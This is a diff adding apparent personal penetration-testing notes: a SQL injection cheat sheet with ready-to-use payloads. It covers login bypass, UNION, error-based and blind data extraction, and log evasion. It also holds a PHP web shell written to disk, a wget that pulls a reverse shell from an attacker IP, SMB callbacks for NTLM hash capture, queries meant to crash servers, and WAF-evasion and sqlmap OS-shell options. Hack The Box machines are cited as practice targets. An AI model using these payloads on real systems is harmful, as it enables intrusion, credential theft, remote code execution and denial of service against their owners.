@@ -1,0 +1,589 @@
+SQL Injection:
+=============
+Basics:
+	SQL syntax:
+		verbs:
+			SELECT => retrives data
+			INSERT => add data
+			DELETE => remove data
+			UPDATE => modify table
+			DROP => delete data
+			UNION => combines mutiple queries (Q1 UNION Q2)
+			UNION ALL => Unlike "UNION", Union all will not eliminate duplicate rows, instead it just pulls all the rows from all the tables fitting your query specifics and combines them into a table.
+		common terms:
+			WHERE => filters records based on specific conditions
+			AND/OR/NOT => filters records based on multiple conditions
+			ORDER BY => sorts record in ascending/descending order
+			group_concat(string1,string2)
+				GROUP_CONCAT gives you the capability to combine values across rows
+			concat(<string1>, <string2>, ..) => concatenate strings such as tables, column names
+				CONCAT is used to combine values across columns
+			substring(string_name,position,1)
+			substr(<string>,<offset>,<characters length>) => print string character(s) by providing offset and length
+			length(string_name)
+			like "<string>%" => checks if provided string present
+			sleep(<number of seconds>) => go to sleep for <number of seconds>
+		other commands:
+			version() or @@version
+			database or database0
+			currentuser()
+		special characters:
+			' and " => string delimeters
+			; => ends SQL statement
+			* and % => wildcards
+			|| and + and "" => string concatination
+			= and + and <> => mathematical operators
+			= => testing for equivalence
+			() => calling functions, subqueries, INSERT statements
+			%00 => NullByte
+			Note: 
+	Comments in SQL:
+		Three Types:
+			-- :(aka double-dash comment)
+				It is used to comment the rest of the line.
+				In MySQL, however this operator must be followed by at least one whitespace or control character
+					Example: -- -
+						The last dash basically protects the trailing space.
+					Example: --+
+						Many URL decoders treat + as a space
+			/* comment */ :(Inline comment)
+				If the comment is not closed, an SQL syntax error will be raised.
+				It is less used in SQL injection attacks but it can be useful in some rare cases
+			# :
+				It allows commenting the rest of the line in MySQL. Contrary to the double-dash, it is not necessary to add a space after
+	Meta DB:(information_schema)
+		information_schema is a db which is always present as its ANSI standard.
+		it helps us to determine metadata (databases, tables, coloumns) available:
+			MySQL:
+				it shows all the metadata
+				DB => select schema_name from information_schema.schemata
+				Tables => select table_name from information_schema.tables
+				columns => select column_name from information_schema.columns
+				Note:
+					information_schema.tables => finding table_name
+					information_schema.columns => finding column_name
+			MsSql:
+				its shows the metadata of only the current db
+				DB => select name from sys.databases
+				Tables => select name from sys.tables
+				columns => select name from sys.columns
+			oracle:
+				oracle dont support information_schema, so we use "cheatsheets" on google
+				DB => select owner from all_tables
+				Tables => select table_name from all_tables
+				columns => select column_name from all_tab_columns
+Manual Testing:
+	Testing for sql injection in Forum and parameters:(same for MSSQL/MySQL)
+		A. try the following payloads:
+			*
+			'*'
+			^
+			'^'
+		B. id =1' or login=test'
+			instead of ', we can also try ",),||,+,#,>
+			instead of 1, try 0 and -1
+		C. MS-SQl
+			.asp?s=1
+			.asp?s=1' or '1'='1
+			working:(backend code in ASP)
+				var sql = "SELECT * FROM search where id='"+getid+"'"
+				var sql = "SELECT * FROM search where id='1'"
+				var sql = "SELECT * FROM search where id='2' or 'a'='a'"
+		NOTE: where to test for sqli in a webapp:
+			website forms (login/signup) (login_bypass)
+			HTTP cookie
+			HTTP user-agent
+	Admin login bypass:
+		payloads to try:(step-1)
+			NOTE:
+				use  this list with burp intruder
+			*
+			'*'
+			^
+			'^'
+
+			admin or 1=1
+			admin' or 1=1
+			admin' OR 1=1
+			admin OR 1=1
+
+			admin or 1=1 --
+			admin' or 1=1 -- 
+			admin' OR 1=1 --
+			admin OR 1=1 --	
+
+			admin' or '1' = '1
+			admin' OR '1' = '1
+			admin' or '1' = '1 -- 
+			admin' OR '1' = '1 --
+
+			1 or 1=1
+			1' or 1=1
+			1' OR 1=1
+			1 OR 1=1
+
+			1 or 1=1 --
+			1' or 1=1 -- 
+			1' OR 1=1 --
+			1 OR 1=1 --	
+
+			1' or '1' = '1
+			1' OR '1' = '1
+			1' or '1' = '1 -- 
+			1' OR '1' = '1 --
+
+			admin' or 'a' = 'a
+			admin' OR 'a' = 'a
+			admin' or 'a' = 'a -- 
+			admin' OR 'a' = 'a --
+
+			1' or 'a' = 'a
+			1' OR 'a' = 'a
+			1' or 'a' = 'a -- 
+			1' OR 'a' = 'a --
+			
+			Note:
+				('a'='a) is better than (1=1) as sometimes a WAF can block string delimeters, but a waf dont block single quotes (') as some people have single quote as a part of their name (example: o'brian)
+			Note:
+				we can use these payloads in either username or password or both.
+				its possible when used with both username and password, it dont work
+
+			working:
+				UnQuoted:	
+					payload: 1 or 1=1
+					backend:
+						$value = $_GET['id'];
+						$query = "SELECT * from user where userid=$id";
+						query = SELECT * from user where userid=1 or 1=1;
+				Quoted:
+					payload: 1' or '1'='1
+					backend:
+						query = SELECT * from user where userid='1' or '1'='1';
+		getting admin access:(step-2)
+			so, step-1 can either give direct admin access or give an error.
+			Error indicates that our parameter is vulnerable to SQLi
+			now, we can use sqlmap:
+				see sqlmap guide, its EASY
+		backend code:(to understand whats happening)
+			var sql = "SELECT * FROM users where name='"+fromuser+"' AND password='"+frompwdd+"'"
+			if input is admin:' or 'a'='a:
+				var sql = "SELECT * FROM users where name='"+fromuser+"' AND password='' or 'a'='a' "
+			if input is ' or 1=1 --:xyz:
+				var sql = "SELECT * FROM users where name='' or 'a'='a' -- AND password='xyz'"
+		logging evasion:
+			when we give some input to a webapp, its logged on the webserver as logs
+			user: ' or 1=1 --sp-password
+			pass: xyz
+	Database Fingerprinting:
+		it can be done in multiple ways:
+			1. db error messages can tell us.
+			2. by testing for time delays:
+				id=1' IF(1=1) WAITFOR DELAY '0:0:10' -- => MS-SQL
+				id=1' IF(1=1) SELECT pg_sleep(10) => POSTGRESQL
+				id=1' IF(1=1) SELECT sleep(10) => MySQL
+				id=1' IF(1=1) dbms_pipe.recieve_message(('a'),10) => ORACLE
+			3. by testing for comments:
+				MySQL:
+					#comment
+					/*comment*/
+					-- comment
+				ORACLE:
+					--comment
+				POSTGRESQL:
+					--comment
+					/*comment*/
+				MS-SQL:
+					--comment
+					/*comment*/
+			4. by testing for special functions:
+				select @@version => MySQL
+				connection_id() => MySQL
+				@@pack_recieved => mssql
+				BITAND(1,1) => orcaledb
+			5. string concatination:
+				'de''nt' => MySQL
+				'de'+'nt' => mssql
+				'de'||'nt' => oracledb
+	Five Categories:
+		union based
+		error based
+			XPath
+			double query
+		inferential
+			time based
+			boolean
+		OOB
+	Find the number of columns:(Same for UNION/ERROR)
+		Method-1: Order by
+			id=1 group by X -- => we decrease x till we dont get the db error
+		Method-1: Order by
+			id=1 group by X -- => we decrease x till we dont get the db error
+	Union based SQLi for MySQL and MSSQL:
+		why do we use it?
+			when we want to extract data
+		Once we found number of coumuns as explained above, we have 2 methods:
+			Method-1: Using NULL:
+				id=1 union select NULL,NULL,NULL,@@version --
+				DB => select table_schema from information_schema.columns --
+				TABLES => select table_name,column_name from information_schema.columns where table_schema='our selcted DB' --
+				DATA => select col1,col2 from 'ourdb'.'ourtable' --
+			Method-2:
+				id=1 union select 1,2,3,4,@@version --
+				DB => union select 1,2,3,4,database() --
+				ALL TABLES => union select table_name,2,3,4,5 from information_schema.tables  --
+				TABLES OF OUR DB => union select group_concat(table_name),2,3,4,5 from information_schema.tables where table_schema=database() --
+				COLUMNS OF A TABLE => union select group_concat(column_name),2,3,4,5 from information_schema.columns where table_name="table" --
+				DATA => union select group_concat(col1,col2),2,3,4,5 from "table" --
+		Extracting data from MySQl:
+			id=1 union select 1,2,3,4,(SELECT group_concat(host,user,password) FROM mysql.user) --
+	MySQL Error based SQLi:
+		When there is no output except a MySQL error, you can force your data extraction through the error
+		Note that both of the below methods can be easily automated using Burp’s Intruder and the grep extract functionality.
+		MySQL XPath Error based SQLi:(aka XPATH Injection)
+			Note:
+				works on MySQL version >= 5.1
+			Note:
+				Author => I personally don’t typically resort to even testing this type of injection unless all other methods fail
+			Basics:
+				ExtractValue() function generates a SQL error when it is unable to parse the XML data passed to it. 
+					in our case, the evaluated results of our SQL query, will be be embedded into the subsequent error message.
+					Prepending a full stop or a colon to the beginning of the XML query will ensure the parsing will always fail, thus generating an error with our extracted data.
+				LIMIT function is used to cycle through database information.
+			Exploitation:(append these statements next to id=1)
+				AND extractvalue(rand(),concat(0x3a,version()))-- => Retrieve database version
+				AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,schema_name) FROM information_schema.schemata LIMIT 0,1)))-- => Retrieve database names
+				AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema="database1" LIMIT 0,1)))-- => Retrieve table names
+				AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_NAME="table1" LIMIT 0,1)))-- => Retrieve column names
+				AND extractvalue(rand(),concat(0x3a,(SELECT concat(column1,0x3a,column2) FROM table1 LIMIT 0,1)))-- => Retrieve data
+				AND extractvalue(rand(),concat(0x3a,(SELECT concat(column1,0x3a,column2) FROM database2.table1 LIMIT 0,1)))-- => Retrieve data from another database
+		MySQL double query Error based SQLi:
+			Note:
+				This is a very handy technique to have in your arsenal as there will be many times Union injections just wont work and blind injections are very time consuming and hard to interpret sometimes.
+			This method uses two queries together combined in a single query statement which basically ends up confusing the backend database and causing errors to be thrown. The errors received will contain the information we are trying to extract.
+			Also, we will not be able to access anything using GROUP_CONCAT(), so we will need to use CONCAT() and the LIMIT function to get all of the info from the database.
+			Exploitation:(append these statements next to id=1)
+				Retrieve database version:
+					AND(SELECT 1 FROM(SELECT COUNT(*),concat(version(),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)--
+				Retrieve database names:
+					AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT schema_name FROM information_schema.schemata LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.schemata GROUP BY a LIMIT 0,1)b)--
+				Retrieve table names:	
+					AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="database1" LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.TABLES GROUP BY a LIMIT 0,1)b)--
+				Retrieve column names:	
+					AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="table1" LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.COLUMNS GROUP BY a LIMIT 0,1)b)--
+				Retrieve data:	
+					AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT column1 FROM table1 LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)--
+				Retrieve data from another database:	
+					AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT column1 FROM table1 LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)--
+	MySQL Inference SQLi:(Very Time and Effort Consuming)
+		When no data or error messages are returned, you can use time delays or true/false responses to retrieve database information.
+		MySQL Boolean based SQLi:
+			This is used when the application returns differing results dependent on whether the SQL query we inject evaluates to true or false.
+			If we convert each individual character of the piece of database information we wish to retrieve to their decimal representation using the ASCII function , we can create true or false conditions using the greater than, less than and equals symbols.
+			We can then cycle through the individual characters using the SUBSTRING function and the pieces of database information using the LIMIT function.
+			Test to see if webapp is vulnerable to Boolean based SQLi:
+				AND 1=1 => This query should result in the original page being displayed
+				AND 1=2 => This query should return a different page
+			Exploitation:(append these statements next to id=1)
+				Retrieve version:
+					AND (SELECT version()) LIKE "5%"--
+					AND (ascii(substr((SELECT version()),1,1))) > 52--
+				AND (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))) > 95-- => Retrieve databases
+				AND (ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="database1" LIMIT 0,1),1,1))) > 95-- => Retrieve tables
+				AND (ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="table1" LIMIT 0,1),1,1))) > 95-- => Retrieve columns
+				AND (ascii(substr((SELECT column1 FROM table1 LIMIT 0,1),1,1))) > 95-- => Retrieve data
+				AND (ascii(substr((SELECT column1 FROM database2.table1 LIMIT 0,1),1,1))) > 95-- => Retrieve data from another database
+		MySQL Time based SQLi:
+			If identical pages are returned for true or false responses (means Boolean Based is not working), then time delays can be created by the IF and SLEEP functions and used to deduce database information instead.
+			Test for the presence of the vulnerability:
+				AND sleep(10)-- => should sleep for 10 seconds
+			Exploitation:(append these statements next to id=1)
+				Retrieve version:
+					AND IF((SELECT ascii(substr(version(),1,1))) > 53,sleep(10),NULL)--
+					AND IF((SELECT version()) LIKE "5%",sleep(10),NULL)--
+				AND IF(((ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)))) > 95,sleep(10),NULL)-- => Retrieve databases
+				AND IF(((ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="database1" LIMIT 0,1),1,1))))> 95,sleep(10),NULL)-- => Retrieve tables
+				AND IF(((ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="table1" LIMIT 0,1),1,1)))) > 95,sleep(10),NULL)-- => Retrieve columns
+				AND IF(((ascii(substr((SELECT column1 FROM table1 LIMIT 0,1),1,1)))) > 95,sleep(10),NULL)-- => Retrieve data
+				AND IF(((ascii(substr((SELECT column1 FROM database1.table1 LIMIT 0,1),1,1)))) >95,sleep(10),NULL)-- => Retrieve data from another database
+	MSSQL Error based SQLi:
+		a valid MSSQL query gets executed first, leading to the results of the query being displayed in the error message
+		Find the number of columns:
+			id=1 order by X -- => we decrease x till we dont get the db error	
+		Method-1: using "Group By" and "Having":
+			enumerating table_name and column_name:
+				id=1' HAVING 1=1 --
+					select * from news where id='1' having 1=1 --
+					it will give error like "column 'news.news_id' is invalid"
+					so we got 1 column_name and 1 table_name
+				id=1' GROUP BY news.news_id HAVING 1=1 --
+					it will give us a similiar error , but with one more column_name
+					say, we got 'news.news_author'
+				id=1' GROUP BY news.news_id,news.news_author HAVING 1=1 --
+					it will give us a similiar error , but with one more column_name
+					say, we got 'news.news_detail'
+				id=1' GROUP BY news.news_id,news.news_author,news.news_detail HAVING 1=1 --
+					it gave no error
+					it means we have a table and its 3 columns
+		Method-2: using "convert":
+			Usage:
+				convert(int,x(char)) => convert x(char) into int 
+				1=convert(int,x) 
+			Enumerating OS:
+				id=1+and+1=convert(int,@@version) --
+				id=1+and+1=convert(int,username()) --
+			Extract number of databases:	
+				AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT([name]) AS nvarchar(4000)) FROM [master]..[sysdatabases] )+CHAR(58)+CHAR(58)))--
+			Extract database names (replace N with a number starting from 1):
+				AND 1=CONVERT(INT,db_name(N))--
+				AND 1=CONVERT(INT,(SELECT CAST(name AS nvarchar(4000)) FROM master..sysdatabases WHERE dbid=N))--
+			Enumerating Tables:
+				id=1+and+1=convert(int,(select+top+1+table_name+from+information_schema.tables)) -- => TOP table
+				id=1+and+1=convert(int,(select+top+1+table_name+from+information_schema.tables+where+table_name+not+in+('1st table'))) -- => 2nd TOP table
+			Enumerating Columns:
+				id=1+and+1=convert(int,(select+top+1+column_name+from+information_schema.columns+where table_name='table name')) -- => TOP column
+				id=1+and+1=convert(int,(select+top+1+column_name+from+information_schema.columns+where table_name='table name'+and+column_name+not+in+('col1'))) -- => TOP column => 2nd TOP column
+			Enumerating Data:
+				id=1+and+1=convert(int,(select+top+1+'column name'+from+'table name')) -- => row1
+				id=1+and+1=convert(int,(select+top+1+'column name'+from+'table name'+where+'column name'+not+in+('row1'))) -- => row2
+			Note:
+				be sure to encode space/+ with %2b if inputting directly into the address bar.
+	MSSQL Inference SQLi:(Very Time and Effort Consuming)
+	Stacked Queries:(Oracle and MySQL don't support stacked queries. MSSQL and PostgreSQL support them)
+		Real Benefit of stacked queries is that, they allow us to break out of a query and let us do other malicous stuff.
+		QUERY-1-HERE; QUERY-2-HERE
+		Example:
+			User: dent
+				backend => Select * from users where lname='dent';
+			User: dent'; CREATE TABLE exfil (data varchar(1000)); --
+				payload => '; CREATE TABLE exfil (data varchar(1000)); --
+				backend => Select * from users where lname='dent'; CREATE TABLE exfil (data varchar(1000)); -- ';
+		As we can see in above example, "stacked queries" helped us to break out of where clause of select statement and helped us creat a new table.
+	Out-of Band:(helps in getting Hash/shell)
+		The idea is fairly simple, instead of capturing the data you would like to retrieve and extracting it through Boolean-logic you can request the system to transmit the data over a protocol such as HTTP, SMB or DNS.	
+		OOB MSSQL SQLi:
+			xp_cmdshell:
+				Basics:
+					xp_cmdshell allows to execute any command on OS.
+				Requirements:
+					only sysadmin can enable xp_cmdshell
+					To check if the current user is sysadmin:
+						id=1 union select 1,2,3,4,(SELECT is_srvrolemember('sysadmin')) --
+				Usage:
+					EXEC xp_cmdshell ‘whoami'
+					Note:
+						if we get an error like "Msg 15281, Level 16, State 1, Procedure xp_cmdshell, Line 1", then:
+							EXEC sp_configure ‘show advanced options’, 1
+							RECONFIGURE
+							EXEC sp_configure ‘xp_cmdshell’, 1
+							RECONFIGURE
+							Now, try xp_cmdshell command again
+			xp_dirtree:
+				Basics:
+					xp_dirtree command is used to load a file, and we exploit by telling the db that the file is in an SMB share on my host
+				Getting NTLMv2 hash of mssql_svc using responder and SQLi via Stacked Queries:
+					id=1; EXEC master..xp_dirtree '\\my_ip\a' -- 
+					responder -I tun0
+					used in HTB::Giddy
+				Getting NTLMv2 hash of mssql_svc using responder and mssqlclient.py:
+					mssqlclient.py username@ip	
+						mssql> xp_dirtree '\\my_ip\a';
+						Note:
+							To read more about Responder tool, read Active Directory Sheet
+					responder -I tun0
+					used in HTB::Querier
+					Note:
+						To read more about Responder tool, read Active Directory Sheet
+		OOB MySQL SQLi:
+			LOAD_FILE():
+				Basics:
+					It is same as xp_dirtree of MSSQL. But, it can be used to both load a file from attacker to victim and from victim to attacker
+				Getting NTLMv2 hash of mssql_svc using responder and SQLi via Union SQLi:
+					id=1' UNION SELECT 1,load_file('\\\\my_ip\\a'),3-- -
+					responder -I tun0
+					Used in HTB::Bankrobber
+				LFI via Load_File():
+					1' UNION SELECT 1,load_file('c:\\xampp\\htdocs\\admin\\backdoorchecker.php'),3;-- -
+					1' UNION SELECT 1,load_file("/etc/passwd"),3;-- -
+					Used in HTB::Bankrobber,HTB::Jarvis
+			INTO OUTFILE():
+				Basics:
+					Its used to upload a file.
+				Upload a PHP shell Via SQLi in MySQL:
+					Basics Shell for command execution:
+						UNION ALL SELECT null,'<?php echo system($_REQUEST ["cmd"]); ?>',null,null,null,null,null INTO OUTFILE '/var/www/html/shell.php';-- -
+						Used in HTB::Jarvis
+					Uploading a shell to upload a proper PHP rev shell	
+						id=1 union select 1,2,3,4,(select '<?php exec(\"wget -O /var/www/html/shell.php http://10.10.14.12:5555/php-reverse-shell.php\");?>'),3,4,5,6,7 INTO OUTFILE '/var/www/html/test4.php' --
+						python3 -m http.server 80
+						nc -nvlp 53
+						Used in HTB::Jarvis
+	DDOS Using SQL injection:(Web Application Level DDOS)
+		We send complex SQL queries to the db to increase power consumption of Web Server and to Exhaust the Server resources
+		Sql Queries:(Payloads)
+			select tab1 from (select decode(encode(convert(compress(post) using latin1),concat(post,post,post,post)),sha1(concat(post,post,post,post))) as tab1 from table_1)a;
+			select tab1 from (select decode(encode(convert(compress(post) using latin1),des_encrypt(concat(post,post,post,post),8)),des_encrypt(sha1(concat(post,post,post,post)),9)) as tab1 from table_1)a;
+		Using these Sql Queries:
+			http://site.com/link.php?id=1' union select 1,2,3,4-- //vuln site
+			lets us assume 3rd column is vulnerable
+				http://site.com/link.php?id=1' union select 1,2,(select tab1 from (select decode(encode(convert(compress(post) using latin1),des_encrypt(concat(post,post,post,post),8)),des_encrypt(sha1(concat(post,post,post,post)),9)) as tab1 from table_1)a),4--
+			countinuesly sending this injection to the website using a script will get the server down
+	WAF Bypass for SQLi:
+		Bypass String:
+			/!00000UNION*/ /*!00000SELECT*/
+		Encoding:
+			= => %3d
+			space => +
+		Capital Letters:
+	Important Note for manual SQLi:
+		1. Always use BURP for SQLi.
+		2. Use Burp Repeater instead of directly sending payloads via proxy tab as Repeater will let us use a single request multiple times.
+		3. Always URL-Encode the payload before sending it. 
+			ctrl + u => command to URL-Encode.
+Automated Testing:
+	SQLMAP Guide:(MySQL|MSSQL|ORACLE|POSTGRESQL|SQLITE|more)
+		specifying url:(synatx of "-u")
+			-u aa
+			-u 'aa'
+			-u "aa"
+		using sqlmap on forms(login pages):
+			sqlmap -u '' --forms
+		GET parameter:
+			sqlmap -u http://target.com/a.php?id=1 //GET parameter
+		POST parameter:
+			sqlmap -u --data=id=x&pass=pass123
+		REQUEST:(both POST and GET)
+			copy HTTP request from BurpSuite and save it s request.req
+			sqlmap -r request.req
+		to use deadult settings:
+			--batch => this option helps in providing default answers to questions which sqlmap asks throughout the testing
+		Authenciated testing:
+			A. we can use authenicated requests "-r file.req"
+			B. specifying cookie:
+				--cookie="xxxx:xxxx-------"
+		Specifying vulnerable parameter:
+			in REQUEST/POST/GET, we may have more than 1 parameters and sqlmap will take a lot of time to find the vulnerable parameter. So, if we know the vulnerable parameter via recon, we can mention it.
+			sqlmap -u http://target.com/a.php?id=1&s=12 -p id //GET parameter
+			sqlmap -r request.req -p pass
+			sqlmap -u http://target.com/a.php?id=*&s=12 //GET parameter
+				* represents the vulnerable parameter
+		Specifying dbms:
+			sometimes, sqlmap fails to identify the DBMS and we know it by recon
+			sqlmap -u '' --dbms=MySQL
+		Bypassing WAF:
+			Specifying user-agent:
+				--user-agent=xxxx
+				--random-agent => supplies random user-agent
+				Note:
+					default "user-agent" of sqlmap is easily caught by WAFs. So always use user-agent of browser.
+			Specifying referer:
+				--referer=xxxx
+				WAFs also look at referer header to make sure that "flow of website" is in order.
+			Tamper Scripts:
+				General Tamper testing:
+					tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
+				MSSQL:
+					tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2MySQLdash,space2plus,space2randomblank,unionalltounion,unmagicquotes
+				MySQL:
+					tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2MySQLdash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
+				NOTE:
+					to see info a about each of tamper script use this:
+					sqlmap --list-tampers
+		Level and Risk:
+			Levels:(5)
+				1. default
+				2. Adds HTTP "cookie" header testing
+				3. Adds HTTP "user-agent/referer" header testing
+				4.
+				5. Adds HTTP "host" header testing
+				--level=x
+			Risks:(3)
+				1. default/normal
+				2. Medium => Adds testing for "heavy query time-based SQLI"
+				3. Hard => Adds testing for "OR-based SQLI"
+				issue => all risks have possibility of deleting/updating DB
+				--risk=y
+		enumerating DB:
+			--dbs => show databases
+			-D a --tables => show tables
+			-D a -T b --columns => show columns
+			-D a -t b --dump => dump data of table
+			--dump-all => dumps everything
+		DB exploitation:
+			Files:
+				--file-read=/etc/paasswd
+				--file-write "xx" --file-dest "c:/windows":
+					can be used to upload nc.exe
+			--priv-esc => escalate DB privileges
+		Shell:
+			--sql-shell:
+				it allows to do things which we can do in a database interpreter (like MySQL cli). Basically, we can maake changes to the DBMS.
+			--os-shell => gets OS shell by exploiting SQLI
+			--os-cmd=command => runs "command"
+			--os-pwn:
+				select metasploit and PHP as options
+				it will provide a meterpreter shell
+		Advanced Options:
+			TOR:
+				it is completely for anonimity purposes
+				requirement:
+					we need to have TOR installed (apt-get install tor)
+				sqlmap --check-tor => to check if tor is present
+				sqlmap -u '' --tor --tor-type=SOCKS5
+		using proxy:
+			--proxy => requests from sqlmap will pass through proxy aand then will go to target
+			use: helps in analysis of vulnerable paramater
+			we use BurpSuite as proxy
+			sqlmap -u --proxy=http://127.0.0.1:8080		
+	Sqlninja Guide:(MSSQL)
+		flags:
+			-m => attack mode
+				modes:
+					test:(t)
+						Its used in BEGINING to test whether configuration file is correct and whether there is a sql vuln present
+					fingerprint:(f)
+						fingerprintes the remote server
+					bruteforce:(b)
+					escalation:(e)
+					resurrectxp:(x)
+					upload:(u)
+					dirshell:(s)
+					backscan:(k)
+					revshell:(r)
+					dnstunnel:(d)
+					icmpshell:(i)
+					metasploit:(m)
+					sqlcmd:(c)
+						mode to execute commands on shell
+						Note:
+							the best way to check if a command is working is by 
+							kali> nc -nvlp 80 (acting as web server)
+							cmd> ping my_ip
+							issue:
+								in case, we are attacking a website, we need our own server to test this
+					getdata:
+			-f => configuration file 
+				file.conf:
+					First line => --httprequest_start--
+					after 1st line:
+						copy the request from burp and paste it, append __SQL2INJECT__ in front of parameter(s) you want to attack
+					Last line => --httprequest_end--
+				example:
+					--httprequest_start--
+					-----burp request-----
+					user=test';__SQL2INJECT__&pass=test';__SQL2INJECT__
+					-----burp request-----
+					--httprequest_end--
+			-p sa_password:
+				sa => user having admin privileges
+				used in escalation mode to add current DB user to the sysadmin group
+				used in other modes to run query as admin
+			-w => wordlist for bruteforce mode
+			-g => in upload mode, it generates debug script and exit
+			-d debug_mode:
+				helps to see the queries used by the tool/requests/responses
+				modes:
+					1 => print each SQL command that is being injected
+					2 => print each HTTP request that is sent to the target
+					3 => print each HTTP response that is received from the target
+					all => all of the above
+		sqlninja -f file.conf -m <mode> <parameters>
